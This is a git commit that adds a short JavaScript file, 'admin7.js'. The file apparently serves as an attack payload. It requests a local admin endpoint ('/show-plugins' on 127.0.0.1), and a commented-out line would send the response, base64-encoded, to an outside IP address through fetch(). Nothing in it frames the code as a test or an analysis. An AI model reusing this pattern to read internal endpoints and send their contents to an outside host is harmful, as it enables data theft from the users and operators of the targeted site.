aef269e2573c6b4919c002231358e1e08395f8bd
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 07:14:07 +0100

    Create admin7.js

---
+++ admin7.js
@@ -0,0 +1,15 @@
+const url4 = 'http://127.0.0.1/show-plugins';
+
+// Making a GET request using fetch()
+fetch(url4)
+  .then(response => {
+    return response.json();
+  })
+  .then(data => {
+    console.log("Here is the data");
+    console.log(data);
+    //fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data));
+  })
+  .catch(error => {
+    console.log("error");
+  });
